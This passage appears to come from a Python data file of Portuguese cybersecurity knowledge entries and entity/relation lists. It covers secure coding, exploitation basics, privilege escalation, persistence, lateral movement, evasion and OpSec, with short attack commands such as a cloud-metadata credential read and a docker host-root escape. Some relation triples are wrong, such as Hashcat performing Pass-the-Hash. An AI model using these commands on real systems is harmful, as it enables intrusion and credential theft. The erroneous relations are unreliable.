"""Desenvolvimento web seguro é sobre construir defesas desde o início (shift-left security). Frontend: Content Security Policy (CSP) bloqueia XSS inline — Content-Security-Policy: default-src 'self'; script-src 'self'. subresource integrity (SRI) garante que scripts de CDN não foram alterados. Cookies com Secure + HttpOnly + SameSite=Strict. HTTPS everywhere — sem mixed content. Não confiar em input do usuário em nenhum ponto. Backend: prepared statements / parameterized queries SEMPRE (previne SQLi — NUNCA concatenar strings SQL). ORM (SQLAlchemy, Sequelize, Hibernate) geralmente seguro se usado corretamente. Validação e sanitização de input no servidor (nunca só no cliente). Rate limiting e throttling em endpoints de autenticação. bcrypt/Argon2 para senhas. Nunca logar senhas ou dados sensíveis. Segredos em variáveis de ambiente, não no código. CORS configurado adequadamente — não Access-Control-Allow-Origin: *. JWT: verificar assinatura, expiração, algoritmo (rejeitar 'none'). Dependency scanning: npm audit, pip-audit, Snyk — dependências com CVEs são vetor comum. SAST (Static Application Security Testing): Semgrep, SonarQube, Bandit (Python) — análise estática. DAST (Dynamic): OWASP ZAP, Burp Suite — testa app em execução."""),

("programacao:assembly_exploração",
"""Assembly e exploração de binários são a base do hacking de baixo nível. Registradores x86-64 principais: RAX (acumulador, valor de retorno), RBX, RCX (contador em loops), RDX, RSI (source index), RDI (destination index — primeiro argumento de função no Linux), RSP (stack pointer — topo da pilha), RBP (base pointer — base do frame atual), RIP (instruction pointer — próxima instrução a executar). CONTROLAR RIP = CONTROLAR EXECUÇÃO. Stack (pilha): cresce para baixo (endereços menores). Push decrementa RSP, pop incrementa. Call: push RIP, jmp função. Ret: pop RIP. Buffer overflow: buffer local na pilha, escrita além do limite sobrescreve variáveis locais, saved RBP, saved RIP. Controlling RIP → arbitrary code execution. Shellcode: sequência de bytes que executa shell — /bin/sh via syscall execve. Proteções modernas e como bypassar: ASLR (Address Space Layout Randomization) — endereços aleatórios; bypass com info leak, brute force em 32-bit ou ret2plt. NX/DEP (No-Execute) — stack não-executável; bypass com ROP (Return-Oriented Programming — encadear gadgets existentes no binário). Stack canary — valor aleatório antes do saved RIP detecta overflow; bypass com info leak do canary. PIE (Position Independent Executable) — binário em endereço aleatório; bypass com info leak. GDB + pwndbg/peda: disassemble, break, run, ni/si, x/s, pattern create/offset."""),

# ══════════════════════════════════════════════════════════════════════════════
# SISTEMAS OPERACIONAIS
# ══════════════════════════════════════════════════════════════════════════════

("so:linux_profundo",
"""Linux por dentro — conhecimento essencial para segurança. Kernel: núcleo do sistema, interface entre hardware e software. Rings: Ring 0 (kernel mode — acesso total ao hardware), Ring 3 (user mode — acesso limitado). Syscalls: interface entre user e kernel space — execve, open, read, write, socket, mmap, brk. strace rastreia syscalls de um processo. /proc: sistema de arquivos virtual que expõe informações do kernel em tempo real. /proc/PID/maps (mapa de memória do processo), /proc/PID/fd (file descriptors abertos), /proc/net/tcp (conexões TCP), /proc/cpuinfo, /proc/meminfo. /sys: interface com devices e subsistemas do kernel. Permissões: rwxrwxrwx (owner, group, other). Bits especiais: SUID (executa com permissão do dono — chmod u+s), SGID, Sticky bit. ACLs (Access Control Lists) para controle mais granular. Namespaces (base dos containers): isolam PID, network, mount, user, IPC, UTS. cgroups: limitam recursos (CPU, memória, I/O) por grupo de processos. eBPF: tecnologia poderosa — programas que rodam em kernel space de forma segura. Usado para observabilidade (Falco, Cilium), segurança, networking. Systemd: init system dominante — systemctl start/stop/enable/disable/status, journalctl para logs. Módulos do kernel: lsmod, modinfo, insmod, rmmod — rootkits frequentemente inserem módulos maliciosos."""),

("so:windows_internals",
"""Windows internals para segurança — entender como funciona é entender como atacar e defender. NT kernel: kernel do Windows desde NT 4.0. Dois espaços: user mode e kernel mode. Processos e threads: Process Explorer (SysInternals) mostra hierarquia, DLLs carregadas, handles. Task Manager esconde muito — Process Hacker/Process Monitor são melhores. Registry: base de dados hierárquica de configurações. Hives: HKLM (Local Machine — sistema), HKCU (Current User), HKCR (Classes Root), HKU (Users). Chaves de auto-execução: HKLM\Software\Microsoft\Windows\CurrentVersion\Run. SAM: banco de dados de usuários locais — protegido pelo SYSTEM, contém hashes NTLM. LSA (Local Security Authority): processo que gerencia autenticação. LSASS: LSA Subsystem Service — alvo do Mimikatz (extrai hashes e senhas da memória). Técnicas de evasão de AV/EDR: Process injection (code injection, DLL injection, process hollowing — injetar código em processo legítimo como svchost.exe), AMSI bypass (Antimalware Scan Interface — PowerShell e .NET passam scripts pelo AMSI antes de executar), LOLBins (Living Off the Land Binaries — usar binários legítimos do Windows para fins maliciosos — certutil, mshta, regsvr32, rundll32, wscript). ETW (Event Tracing for Windows) — telemetria que EDRs usam. Windows Defender: baseado em assinaturas + comportamento heurístico. Defender for Endpoint: EDR da Microsoft."""),

# ══════════════════════════════════════════════════════════════════════════════
# CLOUD E DEVOPS
# ══════════════════════════════════════════════════════════════════════════════

("cloud:aws_profundo",
"""AWS (Amazon Web Services) domina o mercado cloud com 33% de share. Serviços críticos para segurança: IAM (Identity and Access Management): usuários, grupos, roles, políticas. Princípio do menor privilégio. Nunca usar root account para operações diárias. MFA obrigatório em toda conta privilegiada. Roles para EC2/Lambda — não credenciais hardcoded. EC2 (Elastic Compute Cloud): máquinas virtuais. Security Groups (firewall stateful por instância). VPC (Virtual Private Cloud): rede isolada, subnets públicas/privadas, Internet Gateway, NAT Gateway. S3 (Simple Storage Service): object storage. Buckets públicos são o maior vetor de vazamento de dados na nuvem. Block Public Access deve estar habilitado por padrão. Políticas de bucket vs ACLs. Server-side encryption (SSE-S3, SSE-KMS). RDS/Aurora: bancos de dados gerenciados. Nunca expor na internet — subnets privadas. KMS (Key Management Service): gerenciamento de chaves de criptografia. CloudTrail: log de todas as chamadas de API — essencial para auditoria. GuardDuty: threat detection ML — detecta cryptomining, acessos suspeitos, exfiltração. Security Hub: consolida findings de múltiplos serviços. AWS Config: compliance e configuração. Lambda: serverless — risco de event injection, permissões excessivas de IAM role. Painel de ataque EC2: metadata endpoint (curl http://169.254.169.254/latest/meta-data/iam/security-credentials/) expõe credenciais temporárias de IAM roles."""),

("cloud:docker_kubernetes",
"""Containers transformaram deployment — e trouxeram novos riscos. Docker: containers são processos isolados com namespaces e cgroups. Não são VMs — compartilham o kernel do host. Imagens: camadas imutáveis. Dockerfile: FROM (imagem base), RUN (executa comando), COPY, ADD, EXPOSE, ENV, CMD/ENTRYPOINT. Erros de segurança comuns: rodar como root (--user flag), montar socket do Docker (-v /var/run/docker.sock:/var/run/docker.sock — equivale a root no host), usar :latest (não determinístico), imagens com vulnerabilidades (Trivy scan: trivy image minha-imagem), secrets em ENV ou RUN (ficam nas camadas). Escape de container: montar docker.sock, cgroups release_agent, CVE de kernel. Kubernetes (K8s): orquestrador de containers. Componentes: Control Plane (API Server, etcd, Scheduler, Controller Manager), Worker Nodes (kubelet, kube-proxy, container runtime). RBAC (Role-Based Access Control): gerencia quem pode fazer o quê no cluster. Erros: RBAC overpermissive (ClusterAdmin para tudo), Pods sem Security Context (rodam como root), etcd sem autenticação (banco de dados do cluster — contém todos os segredos), Network Policies ausentes (todo pod fala com todo pod por padrão). Ferramentas de segurança K8s: kube-bench (verifica CIS Benchmark), Falco (runtime security), OPA/Gatekeeper (políticas de admissão), Trivy (scan de imagens)."""),

("cloud:devops_segurança",
"""DevSecOps integra segurança no ciclo de desenvolvimento sem atrasar. Shift-left: trazer segurança para o início do desenvolvimento, não só no final antes do release. Pipeline de CI/CD seguro: SAST (Static Analysis Security Testing) — Semgrep, Bandit, ESLint security rules, CodeQL. SCA (Software Composition Analysis) — Snyk, OWASP Dependency-Check, Dependabot — CVEs em dependências. Secrets scanning — GitLeaks, Trufflehog, git-secrets — impede credentials no repositório. DAST — OWASP ZAP, Burp Suite automatizado — testa a aplicação em execução. Container scanning — Trivy, Clair, Snyk Container. Infrastructure as Code (IaC) security — Checkov, tfsec, terrascan — valida Terraform, CloudFormation, Kubernetes YAML antes do deploy. Secrets management: HashiCorp Vault, AWS Secrets Manager, Azure Key Vault — nunca variáveis de ambiente direto em produção. GitOps: git como única fonte da verdade. Git branching strategy e proteções de branch. Assinatura de commits (GPG/SSH) para garantir autenticidade. Supply chain security (SLSA framework): garantir integridade de todo o pipeline — SolarWinds e Log4Shell mostraram o impacto de supply chain attack. SBOM (Software Bill of Materials): inventário de todos os componentes de software."""),

# ══════════════════════════════════════════════════════════════════════════════
# HACKING AVANÇADO
# ══════════════════════════════════════════════════════════════════════════════

("hacking:escalada_privilegios",
"""Escalada de privilégios (privilege escalation) é o processo de obter mais permissões do que as inicialmente concedidas — de usuário para root no Linux, de user para SYSTEM/Domain Admin no Windows. Linux PrivEsc: SUID/SGID binários (find / -perm -4000 2>/dev/null — verificar no GTFOBins), sudo -l (comandos que o usuário pode rodar como root), Sudo versão vulnerável (CVE-2021-3156 — Baron Samedit — buffer overflow no sudo), Cron jobs com scripts world-writable (crontab -l e /etc/cron.*), PATH hijacking (script root chama binário relativo — criar binário falso no PATH), LD_PRELOAD malicioso (se sudo preserve LD_PRELOAD), Capabilities (getcap -r / 2>/dev/null — python3 com cap_setuid é root), NFS no_root_squash (montar NFS como root e criar SUID binary), Kernel exploits (uname -a → searchsploit → DirtyPipe CVE-2022-0847 no kernel 5.8-5.16.11, DirtyCoW CVE-2016-5195), Docker group membership (docker run -v /:/mnt alpine chroot /mnt — root no host), Writable /etc/passwd (gerar hash com openssl e adicionar usuário root), python library hijacking. Windows PrivEsc: AlwaysInstallElevated (MSI packages executam como SYSTEM), Unquoted service paths, Writable service binary, Weak service permissions (sc.exe qc SERVICO), Token impersonation (SeImpersonatePrivilege — JuicyPotato, PrintSpoofer, RoguePotato), DLL hijacking, Autologon credentials no registry, Stored credentials (cmdkey /list), Scheduled tasks writable."""),

("hacking:persistencia",
"""Persistência garante que o acesso seja mantido mesmo após reinicializações, mudança de senha ou outras ações defensivas. Linux persistence: Crontab (@reboot cmd, * * * * * cmd), /etc/cron.d/, /etc/rc.local, systemd service (criar unit file em /etc/systemd/system/), ~/.bashrc ou ~/.bash_profile (executa ao login de usuário), /etc/profile.d/ (executa para todos usuários), SSH authorized_keys (adicionar chave pública — acesso sem senha), LD_PRELOAD (biblioteca carregada em todos processos), Kernel module (insmod — rootkit sofisticado), PAM backdoor (modificar libpam — backdoor de senha), Logrotate exploit, MOTD scripts. Windows persistence: Registry Run keys (HKLM/HKCU\Software\Microsoft\Windows\CurrentVersion\Run), Scheduled Tasks (schtasks /create), Services (sc create), Startup folder (%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup), DLL hijacking no PATH, COM object hijacking, Boot/Pre-OS (bootkit, UEFI implant — extremamente sofisticado), WMI event subscription (wmiprvse — difícil de detectar), Office macros, Print spooler DLL, Screensaver (.scr). Persistência sofisticada de APT: firmware implants (UEFI rootkits — Lojax, MosaicRegressor), firmware de hardware de rede."""),

("hacking:movimento_lateral",
"""Movimento lateral é a técnica de mover-se pela rede após comprometer o ponto inicial de acesso para alcançar o objetivo real. Técnicas Windows: Pass-the-Hash (usar hash NTLM sem precisar da senha em texto claro — psexec, wmiexec, smbexec), Pass-the-Ticket (usar ticket Kerberos roubado com Rubeus/Mimikatz), Over-Pass-the-Hash (usar hash para obter TGT — combina PtH e PtT), DCOM lateral movement, WMI (wmic /node:TARGET process call create "cmd.exe"), PsExec (Sysinternals — executa processos remotamente via SMB), SMBexec, RDP (se habilitado), WinRM (PowerShell remoto — Enter-PSSession, Invoke-Command). Redes: ARP cache poisoning (Ettercap, Bettercap — intercepta tráfego local), LLMNR/NBT-NS poisoning (Responder — captura hashes NTLMv2 na rede), IPv6 attacks (mitm6 — IPv6 DNS hijacking em redes IPv4). Linux lateral movement: SSH com chaves (checar ~/.ssh/ e /etc/ssh/ por chaves e known_hosts), Reutilização de credenciais (mesmo usuário/senha em múltiplos hosts), sudo sem senha para outros hosts, Docker/K8s para escapar para outros namespaces/nodes. Post-exploitation frameworks: Cobalt Strike (comercial — padrão da indústria para red team), Metasploit Meterpreter, Sliver, Havoc (open source)."""),

("hacking:anonimato_opsec",
"""OpSec (Operations Security) e anonimato são críticos para quem faz trabalho ofensivo legalmente ou pesquisa. TOR (The Onion Router): múltiplas camadas de criptografia e roteamento por relays voluntários. Entry node conhece seu IP, exit node conhece o destino, nenhum dos dois conhece os dois. Não é perfeito: correlação de tráfego por adversário global, exit nodes maliciosos (decriptam tráfego não-HTTPS), fingerprinting de browser. Tor Browser: usa TOR + hardening de Firefox. .onion sites: serviços anonimizados — acessíveis só via TOR. VPN: criptografa tráfego entre você e o servidor VPN, que faz requisições em seu lugar. Limita quem vê o quê — não é anonimato completo. Confiança total no provedor de VPN. Jurisdição importa. Provedores sem logs auditados: Mullvad, ProtonVPN. Proxychains: roteia qualquer aplicação via SOCKS5/TOR. VPS offshore: em países com pouca cooperação judiciária. Máquinas virtuais descartáveis. Live OS (Tails — amnésia total, roda da RAM, sem persistência). OPSEC lapses que derrubaram hackers: logar na plataforma hacker e na conta pessoal do mesmo IP, usar e-mails pessoais, estilos de escrita identificáveis, metadados em documentos/fotos, reutilizar nomes de usuário. A maior vulnerabilidade sempre é humana."""),

# ══════════════════════════════════════════════════════════════════════════════
# TECNOLOGIA GERAL
# ══════════════════════════════════════════════════════════════════════════════

("tech:git",
"""Git é o sistema de controle de versão distribuído mais usado. Conceitos fundamentais: Repositório (local ou remoto), Commit (snapshot do estado dos arquivos + mensagem + hash SHA1), Branch (ponteiro para commit — branches são baratos em Git), Merge (combinar branches — merge commit ou fast-forward), Rebase (reescrever histórico — lineariza commits), HEAD (ponteiro para o commit atual/branch atual), Index/Staging Area (área intermediária antes do commit). Comandos essenciais: git init, git clone, git add (staging), git commit -m, git push/pull, git branch, git checkout / git switch, git merge, git rebase, git log --oneline --graph, git diff, git stash, git reset (--soft, --mixed, --hard — níveis de destrutividade), git revert (cria commit desfazendo), git cherry-pick (pega commit específico de outro branch). Para segurança: git log --all --oneline encontra commits "apagados", git show HASH vê conteúdo de qualquer commit, git grep procura padrões em todo histórico — credenciais commitadas são permanentes mesmo após remoção (BFG Repo Cleaner ou git filter-repo para limpeza). Pre-commit hooks: executam scripts antes de cada commit — pode bloquear secrets, rodar linters. GitHub Actions: CI/CD integrado — pode ser abusado se workflows writable por PRs externos."""),

("tech:banco_dados",
"""Bancos de dados são alvos prioritários — contêm os dados que realmente importam. SQL (Structured Query Language): SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, ALTER. JOINs: INNER (só correspondências), LEFT (todos da esquerda), RIGHT (todos da direita), FULL OUTER. Subqueries, GROUP BY, HAVING, ORDER BY, LIMIT. Índices: aceleram leitura mas custam na escrita e espaço — crucial para performance. EXPLAIN ANALYZE: mostra plano de execução de query. Transações ACID: Atomicidade (tudo ou nada), Consistência (banco sempre em estado válido), Isolamento (transações não se interferem), Durabilidade (commit persiste mesmo com falha). Bancos populares: PostgreSQL (mais robusto e features — preferido para produção), MySQL/MariaDB (muito usado em web — LAMP stack), SQLite (embarcado, arquivo único — ótimo para desenvolvimento/apps locais), Microsoft SQL Server (corporativo Windows), Oracle (enterprise). NoSQL: MongoDB (documents JSON — schemaless, flexível, mas sem ACID nativo — muito atacado por MongoDB exposto na internet), Redis (in-memory key-value — cache, sessões, filas), Cassandra (wide-column — alta disponibilidade, escala horizontal), Elasticsearch (busca full-text). SQL Injection prevenção: prepared statements/parameterized queries em TODA interação com BD. ORMs geralmente seguros se usados corretamente."""),

("tech:api_rest",
"""APIs (Application Programming Interfaces) são a cola da internet moderna — praticamente todo sistema se comunica via API. REST (Representational State Transfer): arquitetura, não protocolo. Princípios: stateless (cada request tem toda info necessária), recursos como URLs (/users/123), métodos HTTP para operações CRUD (GET-leitura, POST-criar, PUT/PATCH-atualizar, DELETE-remover), representações (JSON dominante, XML legado). HTTP Status codes: 2xx (sucesso — 200 OK, 201 Created, 204 No Content), 3xx (redirecionamento), 4xx (erro do cliente — 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 429 Too Many Requests), 5xx (erro do servidor — 500 Internal Server Error, 503 Service Unavailable). Autenticação em APIs: API Keys (simples, mas se comprometida dá acesso total), OAuth 2.0 + JWT (padrão moderno), mTLS (certificados mútuos — altíssima segurança). Ataques a APIs: IDOR (mudar /api/users/1 para /api/users/2), mass assignment (enviar campos extras não esperados), excessive data exposure (API retorna mais dados que necessário), broken function-level authorization, injection. GraphQL tem superfície de ataque diferente: introspection (mapeia toda a API), deep nesting (DoS), mutation abuses. API documentation: Swagger/OpenAPI — excelente para segurança (atacante ama API docs públicas)."""),

("tech:hardware_computadores",
"""Hardware moderno é fascinante e tem implicações de segurança. CPU: executa instruções em ciclos de clock. Arquiteturas: x86-64 (Intel/AMD — dominante em servidores e desktops), ARM (Apple Silicon M1/M2/M3 — eficiência energética superior; Android, iOS, servidores crescentes), RISC-V (open source, crescente). Spectre e Meltdown (2018): vulnerabilidades de hardware que afetaram virtualmente todos os processadores — exploram execução especulativa para vazar dados de memória entre processos e kernels. Impossível corrigir sem hardware novo — patches de software têm custo de performance. GPU: Graphics Processing Unit — paralelismo massivo (milhares de núcleos). Usada para AI/ML (NVIDIA domina com CUDA), mineração de criptomoedas, cracking de senhas (hashcat na GPU é 100-1000x mais rápido que CPU). NVIDIA RTX 4090 cracker de hashes mais rápido disponível ao público. RAM: memória volátil — dados somem ao desligar (exceto cold boot attack — conteúdo persiste por segundos/minutos após remoção se resfriada). DDR5 atual. LPDDR para mobile. Storage: SSD (NVMe via PCIe — muito mais rápido que SATA), HDD (mais barato por GB — ainda para backup e arquivamento). Full disk encryption (BitLocker, FileVault, LUKS/dm-crypt) protege dados em repouso. TPM (Trusted Platform Module): chip dedicado a operações criptográficas, armazenamento de chaves, attestation do estado do boot — base do Secure Boot."""),

("tech:inteligencia_artificial",
"""Inteligência Artificial está transformando a cibersegurança em ambos os lados. IA para ataque: Spear phishing hiperpersonalizado e em escala (GPT-4 escreve e-mails convincentes em qualquer idioma), deepfakes de vídeo/voz para fraude e engenharia social, fuzzing inteligente de APIs e aplicações, geração de variantes de malware que bypassam assinaturas de AV, automação de vulnerabilidades conhecidas. IA para defesa: UEBA (User and Entity Behavior Analytics — detecta comportamento anômalo), EDR com ML (detecção de fileless malware e zero-days pelo comportamento), NLP para análise de logs e correlação de eventos, threat intelligence automatizada, patch prioritization. LLMs (ChatGPT, Claude, Gemini, Llama): excelentes para: explicar código, buscar vulnerabilidades em código, gerar scripts de automação, pesquisar TTPs de ataques, ajudar com CTFs. Limitações: alucinações (inventam CVEs, funções que não existem), knowledge cutoff, não executam código real (a não ser com ferramentas). Machine Learning fundamentals: Supervised (classificação, regressão), Unsupervised (clustering, anomaly detection), Reinforcement (agente aprende por reward). Redes neurais, transformers (base dos LLMs), CNNs (imagens). Python: scikit-learn, TensorFlow, PyTorch, Hugging Face. Prompt injection: novo vetor de ataque — injetar instruções no contexto de um LLM para manipular seu comportamento."""),

("tech:blockchain_cripto",
"""Blockchain e criptomoedas têm implicações profundas de segurança. Blockchain: livro-razão distribuído, imutável, transparente. Cada bloco contém: hash do bloco anterior (encadeamento), transações, timestamp, nonce (proof of work). Consenso: Proof of Work (Bitcoin — mineiros competem para resolver hash — consumo energético enorme), Proof of Stake (Ethereum pós-merge — validadores apostam coins — muito mais eficiente). Bitcoin: UTXO model (Unspent Transaction Outputs), carteiras são pares de chaves ECDSA (privada assina, pública é o endereço), transações broadcast para mempool, mineradores incluem no bloco, 6 confirmações = praticamente irreversível. Pseudonimato, não anonimato — análise de blockchain (Chainalysis) rastreia movimentações. Ethereum: smart contracts (código que roda na blockchain — Solidity), EVM (Ethereum Virtual Machine), DeFi (Decentralized Finance), NFTs (ERC-721). Vulnerabilidades de smart contracts: reentrância (The DAO hack — U$60M em 2016), integer overflow/underflow, access control, front-running. Auditorias de código são essenciais antes do deploy — código imutável significa bugs são permanentes. Ransomware e criptomoedas: pagamentos anônimos facilitaram a explosão do ransomware. Monero (XMR): maior privacidade que Bitcoin — ring signatures, stealth addresses. Exchanges são alvos: Mt. Gox (850k BTC em 2014), Bitfinex (120k BTC em 2016)."""),

("tech:redes_sem_fio",
"""Redes sem fio além do WiFi — Bluetooth, NFC, RFID, SDR. Bluetooth: protocolo de curto alcance (Bluetooth Classic até 100m, BLE/Bluetooth Low Energy para IoT — menor consumo). Versões: BR/EDR (Classic), BLE (4.x+), Bluetooth 5.x (maior alcance e velocidade). Ataques: Bluejacking (enviar mensagens não solicitadas), Bluesnarfing (acesso não autorizado a dados — contatos, calendário), BlueBorne (CVE-2017-0781/85 — RCE sem pareamento, 5 bilhões de dispositivos afetados), BIAS (Bluetooth Impersonation Attack), BLESA (BLE Spoofing Attack — reconexão sem autenticação adequada), Sweyntooth (múltiplos CVEs em chips BLE populares — médicos, IoT). NFC (Near Field Communication): <4cm. Usado em pagamentos (Apple Pay, Google Pay, cartões contactless), access control, transferência de dados. Ataques: relay attack (estender distância de comunicação — roubar pagamento), clonagem de cartões NFC não protegidos, NFC fuzzing. RFID (Radio Frequency Identification): rastreamento e controle de acesso. Frequências: LF (125kHz — Hitag, EM4100), HF (13.56MHz — MIFARE, ISO 14443), UHF (860-960MHz — EPC Gen 2). Proxmark 3: ferramenta padrão para ataque a RFID/NFC — clone, emulação, análise. SDR (Software Defined Radio): receptor de rádio configurável por software. RTL-SDR (barato, ~U$25), HackRF, USRP (caro). Demodular qualquer sinal: GPS, GSM, ADS-B (aviões), 433MHz (controles remotos), TPMS (sensores de pneu), comunicações de satélite."""),

("tech:iot_segurança",
"""IoT (Internet of Things) é o campo com menor maturidade de segurança e maior crescimento. Problemas estruturais: senhas padrão nunca alteradas (admin:admin, admin:1234 — Mirai botnet infectou 600k dispositivos assim e derrubou metade da internet em 2016 via DDoS), firmware desatualizado sem mecanismo de update, sem criptografia de comunicação, superfície de ataque enorme (de câmera de bebê a marcapassos). OWASP IoT Top 10: weak passwords, insecure network services, insecure ecosystem interfaces, lack of secure update mechanism, use of insecure/outdated components, insufficient privacy protection, insecure data transfer/storage, lack of device management, insecure default settings, lack of physical hardening. Análise de firmware IoT: binwalk (extrai filesystem), Ghidra/Radare2 (reverse engineering do binário), chroot no filesystem extraído para analisar, QEMU para emular a arquitetura (ARM, MIPS). Shodan para encontrar dispositivos expostos: câmeras, roteadores, PLCs industriais, impressoras. SCADA/ICS (Industrial Control Systems): sistemas de automação industrial — usinas, water treatment, pipelines. Stuxnet (2010) destruiu centrífugas de enriquecimento de urânio iranianas — primeiro cyberweapon documentado. Protocolos industriais (Modbus, DNP3, BACnet) foram projetados para disponibilidade, não segurança."""),

]

# ─────────────────────────────────────────────────────────────────────────────
# ENTIDADES E RELAÇÕES TECH/CYBER
# ─────────────────────────────────────────────────────────────────────────────

TECH_ENTITIES = [
    # Ferramentas de segurança
    ("Nmap", "ferramenta", "CYBERSEC"),
    ("Metasploit", "ferramenta", "CYBERSEC"),
    ("Burp Suite", "ferramenta", "CYBERSEC"),
    ("Wireshark", "ferramenta", "CYBERSEC"),
    ("Hashcat", "ferramenta", "CYBERSEC"),
    ("John the Ripper", "ferramenta", "CYBERSEC"),
    ("Mimikatz", "ferramenta", "CYBERSEC"),
    ("BloodHound", "ferramenta", "CYBERSEC"),
    ("Hydra", "ferramenta", "CYBERSEC"),
    ("SQLmap", "ferramenta", "CYBERSEC"),
    ("Aircrack-ng", "ferramenta", "CYBERSEC"),
    ("Shodan", "ferramenta", "CYBERSEC"),
    ("Responder", "ferramenta", "CYBERSEC"),
    ("Volatility", "ferramenta", "CYBERSEC"),
    ("Autopsy", "ferramenta", "CYBERSEC"),
    ("Ghidra", "ferramenta", "CYBERSEC"),
    ("pwntools", "ferramenta", "CYBERSEC"),
    ("Scapy", "ferramenta", "CYBERSEC"),
    ("Maltego", "ferramenta", "CYBERSEC"),
    ("Nessus", "ferramenta", "CYBERSEC"),
    # Ataques
    ("SQL Injection", "ataque", "CYBERSEC"),
    ("XSS", "ataque", "CYBERSEC"),
    ("Buffer Overflow", "ataque", "CYBERSEC"),
    ("MITM", "ataque", "CYBERSEC"),
    ("Phishing", "ataque", "CYBERSEC"),
    ("Ransomware", "ataque", "CYBERSEC"),
    ("DDoS", "ataque", "CYBERSEC"),
    ("SSRF", "ataque", "CYBERSEC"),
    ("CSRF", "ataque", "CYBERSEC"),
    ("Kerberoasting", "ataque", "CYBERSEC"),
    ("Pass-the-Hash", "ataque", "CYBERSEC"),
    ("Golden Ticket", "ataque", "CYBERSEC"),
    ("Supply Chain Attack", "ataque", "CYBERSEC"),
    ("Spear Phishing", "ataque", "CYBERSEC"),
    # Conceitos
    ("Tríade CIA", "conceito", "CYBERSEC"),
    ("Threat Modeling", "conceito", "CYBERSEC"),
    ("Defense in Depth", "conceito", "CYBERSEC"),
    ("Zero Trust", "conceito", "CYBERSEC"),
    ("Least Privilege", "conceito", "CYBERSEC"),
    ("OWASP Top 10", "conceito", "CYBERSEC"),
    ("CVE", "conceito", "CYBERSEC"),
    ("CVSS", "conceito", "CYBERSEC"),
    ("Red Team", "conceito", "CYBERSEC"),
    ("Blue Team", "conceito", "CYBERSEC"),
    ("SOC", "conceito", "CYBERSEC"),
    ("SIEM", "conceito", "CYBERSEC"),
    ("EDR", "conceito", "CYBERSEC"),
    ("MITRE ATT&CK", "conceito", "CYBERSEC"),
    ("Kill Chain", "conceito", "CYBERSEC"),
    # Criptografia
    ("AES", "criptografia", "TECH"),
    ("RSA", "criptografia", "TECH"),
    ("SHA-256", "criptografia", "TECH"),
    ("TLS", "criptografia", "TECH"),
    ("Argon2", "criptografia", "TECH"),
    ("Ed25519", "criptografia", "TECH"),
    # Tech geral
    ("Linux", "sistema", "TECH"),
    ("Windows", "sistema", "TECH"),
    ("Docker", "tech", "TECH"),
    ("Kubernetes", "tech", "TECH"),
    ("AWS", "cloud", "TECH"),
    ("Git", "tech", "TECH"),
    ("Python", "linguagem", "TECH"),
    ("Bash", "linguagem", "TECH"),
    ("Assembly x86", "linguagem", "TECH"),
    ("Active Directory", "tech", "TECH"),
    ("TCP/IP", "protocolo", "TECH"),
    ("HTTP/HTTPS", "protocolo", "TECH"),
    ("DNS", "protocolo", "TECH"),
    ("SSH", "protocolo", "TECH"),
    ("Kerberos", "protocolo", "TECH"),
    ("Bitcoin", "tech", "TECH"),
    ("Ethereum", "tech", "TECH"),
    ("Machine Learning", "conceito", "TECH"),
    ("CTF", "conceito", "CYBERSEC"),
    ("OSINT", "conceito", "CYBERSEC"),
    ("Pentest", "conceito", "CYBERSEC"),
    ("Bug Bounty", "conceito", "CYBERSEC"),
    ("Engenharia Social", "conceito", "CYBERSEC"),
    ("LGPD", "conceito", "TECH"),
]

TECH_RELATIONS = [
    # Ferramentas <-> técnicas
    ("Metasploit", "automatiza", "Buffer Overflow"),
    ("Metasploit", "automatiza", "SQL Injection"),
    ("Nmap", "suporta", "Pentest"),
    ("Burp Suite", "detecta", "XSS"),
    ("Burp Suite", "detecta", "SQL Injection"),
    ("Burp Suite", "detecta", "CSRF"),
    ("Burp Suite", "detecta", "SSRF"),
    ("SQLmap", "automatiza", "SQL Injection"),
    ("Hashcat", "realiza", "Pass-the-Hash"),
    ("Mimikatz", "extrai", "Pass-the-Hash"),
    ("Mimikatz", "realiza", "Golden Ticket"),
    ("BloodHound", "mapeia", "Active Directory"),
    ("Responder", "captura", "Pass-the-Hash"),
    ("Wireshark", "analisa", "TCP/IP"),
    ("Wireshark", "analisa", "HTTP/HTTPS"),
    ("Volatility", "analisa", "Ransomware"),
    ("Shodan", "suporta", "OSINT"),
    ("Maltego", "suporta", "OSINT"),
    ("Aircrack-ng", "ataca", "WiFi"),
    ("Ghidra", "suporta", "CTF"),
    ("pwntools", "suporta", "CTF"),
    ("pwntools", "explora", "Buffer Overflow"),
    # Ataques relacionados
    ("Phishing", "variante", "Spear Phishing"),
    ("Phishing", "usa", "Engenharia Social"),
    ("Spear Phishing", "usa", "OSINT"),
    ("SQL Injection", "parte_de", "OWASP Top 10"),
    ("XSS", "parte_de", "OWASP Top 10"),
    ("CSRF", "parte_de", "OWASP Top 10"),
    ("SSRF", "parte_de", "OWASP Top 10"),
    ("Ransomware", "usa", "AES"),
    ("Ransomware", "usa", "RSA"),
    ("Kerberoasting", "ataca", "Active Directory"),
    ("Pass-the-Hash", "ataca", "Active Directory"),
    ("Golden Ticket", "ataca", "Kerberos"),
    ("Golden Ticket", "ataca", "Active Directory"),
    ("MITM", "captura", "HTTP/HTTPS"),
    ("DDoS", "afeta", "Disponibilidade"),
    ("Supply Chain Attack", "bypassa", "Defense in Depth"),
    # Conceitos relacionados
    ("Zero Trust", "implementa", "Least Privilege"),
    ("Defense in Depth", "inclui", "Zero Trust"),
    ("Threat Modeling", "identifica", "CVE"),
    ("Red Team", "usa", "MITRE ATT&CK"),
    ("Blue Team", "usa", "MITRE ATT&CK"),
    ("Blue Team", "usa", "SIEM"),
    ("SOC", "opera", "SIEM"),
    ("SOC", "usa", "EDR"),
    ("Kill Chain", "base_para", "MITRE ATT&CK"),
    ("OWASP Top 10", "guia", "Pentest"),
    ("Bug Bounty", "usa", "Pentest"),
    ("CTF", "treina", "Pentest"),
    # Criptografia
    ("TLS", "usa", "AES"),
    ("TLS", "usa", "RSA"),
    ("TLS", "usa", "Ed25519"),
    ("SSH", "usa", "Ed25519"),
    ("SSH", "usa", "AES"),
    ("Ransomware", "usa", "Criptografia"),
    ("AES", "mais_seguro_que", "DES"),
    ("Argon2", "protege", "Pass-the-Hash"),
    ("SHA-256", "usado_em", "Bitcoin"),
    # Tech
    ("Docker", "usa", "Linux"),
    ("Kubernetes", "orquestra", "Docker"),
    ("AWS", "usa", "Docker"),
    ("AWS", "usa", "Kubernetes"),
    ("Git", "suporta", "DevSecOps"),
    ("Python", "linguagem_de", "Pentest"),
